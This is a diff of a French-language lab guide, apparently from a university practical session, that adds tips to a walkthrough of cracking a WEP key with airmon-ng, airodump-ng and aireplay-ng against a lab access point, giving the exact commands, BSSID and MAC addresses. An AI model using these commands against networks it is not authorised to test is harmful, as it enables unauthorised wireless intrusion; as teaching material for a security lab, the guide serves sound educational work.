@@ -1501,9 +1501,12 @@ La carte Wifi se nomme `wlx40a5ef059e47`.
 * Démarrer la carte Wifi en mode de surveillance (monitor mode) :
 ```
 airmon-ng start wlx40a5ef059e47
-airmon-ng start wlan0mon
 ```
 Après activation du mode de surveillance, la carte Wifi se nomme `wlan0mon`.
+
+```
+airmon-ng start wlan0mon
+```
 
 * Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
 ```
@@ -1522,7 +1525,7 @@ La commande doit retourner un pourcentage proche de 100% pour réaliser l'opéra
 
 Il faut désormais lancer deux opérations en parallèle :  
 &ensp; &rarr; Cibler le point d'accès avec `airodump-ng` pour capturer les vecteurs d'initialisation nécessaires au cassage de la clef WEP  
-&ensp; &rarr; Associer la carte Wifi et le point d'accès avec `aireplay-ng`
+&ensp; &rarr; Associer la carte Wifi et le point d'accès avec `aireplay-ng` (réalisé par des cartes Raspberry Pi dans la salle de TP)
 
 * Récupérer les vecteurs d'initialisation (VI) pour l'algorithme de cassage :
 ```
@@ -1530,14 +1533,14 @@ airodump-ng -c 3 --bssid 04:DA:D2:9C:50:53 -w output wlan0mon
 ```
 Les VI générés sont enregistrés dans les fichiers `output*`
 
-* Associer la carte Wifi et le point d'accès :
+* Associer la carte Wifi et le point d'accès (relancer si la commande s'arrête) :
 ```
 aireplay-ng -1 0 -e cracotte04 -a 04:DA:D2:9C:50:53 -h 40:a5:ef:05:9e:47 wlan0mon
 ```
 Le paramètre `-1` permet d'effectuer de fausses authentifications dont le délai entre les demandes est `0`.  
 Pour cela, il est nécessaire de spécifier le BSSID de la carte Wifi utilisée pour le cassage.
 
-Après un certain temps, un nombre suffisant de VI a été capturé et la clef WEP peut alors être cassée à l'aide des fichiers `output*`.
+Après un certain temps, un nombre suffisant de VI (entre 30k et 50k pour de 'Data' récupérées) a été capturé et la clef WEP peut alors être cassée à l'aide des fichiers `output*`.
 
 * Casser la clef WEP du point d'accès :
 ```
